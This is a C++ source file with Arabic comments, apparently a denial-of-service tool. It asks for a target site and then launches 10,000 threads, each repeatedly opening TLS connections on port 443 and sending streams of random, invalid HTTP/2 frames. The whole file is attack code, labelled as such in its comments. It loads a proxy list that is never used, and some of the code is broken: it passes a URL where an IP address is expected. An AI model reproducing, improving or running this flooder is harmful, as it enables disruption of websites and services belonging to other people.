#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <random>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <chrono>
#include <cstring>
#include <curl/curl.h>
#include <fstream>
#include <sstream>

#define THREADS 10000
#define MAX_REQUESTS_PER_CONNECTION 1000

std::atomic<int> active_connections(0);

// توليد إطارات HTTP/2 عشوائية
std::string generate_http2_frame() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    std::string frame;
    frame += static_cast<char>(dis(gen)); // نوع الإطار
    frame += static_cast<char>(dis(gen)); // الأعلام
    frame += static_cast<char>(dis(gen)); // طول الإطار
    frame += static_cast<char>(dis(gen)); // طول الإطار
    frame += static_cast<char>(dis(gen)); // طول الإطار
    frame += "12345"; // معرف الإطار

    return frame;
}

// تحميل قائمة البروكسيات من ملف
std::vector<std::string> load_proxies(const std::string& proxy_file) {
    std::vector<std::string> proxies;
    std::ifstream file(proxy_file);
    std::string line;
    while (std::getline(file, line)) {
        proxies.push_back(line);
    }
    return proxies;
}

// هجوم HTTP/2 Frame Flooding
void http2_frame_flood(const std::string& host, int port, const std::string& proxy) {
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
    SSL_CTX_set_ciphersuites(ctx, "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256");

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            close(sock);
            continue;
        }

        active_connections++;
        std::cout << "Active connections: " << active_connections << "\n";

        // إرسال إطارات HTTP/2 غير صالحة
        for (int i = 0; i < MAX_REQUESTS_PER_CONNECTION; i++) {
            std::string frame = generate_http2_frame();
            SSL_write(ssl, frame.c_str(), frame.size());

            // تقليل مدة النوم بين الإطارات
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
        active_connections--;
    }

    SSL_CTX_free(ctx);
}

// الهجوم الرئيسي
void advanced_attack(const std::string& target, int port, const std::vector<std::string>& proxies) {
    std::vector<std::thread> threads;

    for (int i = 0; i < THREADS; i++) {
        std::string proxy = proxies[i % proxies.size()];
        threads.emplace_back(http2_frame_flood, target, port, proxy);
    }

    for (auto &th : threads) th.join();
}

int main() {
    std::string target;
    std::cout << "أدخل رابط الموقع: ";
    std::cin >> target;

    std::vector<std::string> proxies = load_proxies("proxies.txt"); // قائمة البروكسيات
    advanced_attack(target, 443, proxies);
    return 0;
}
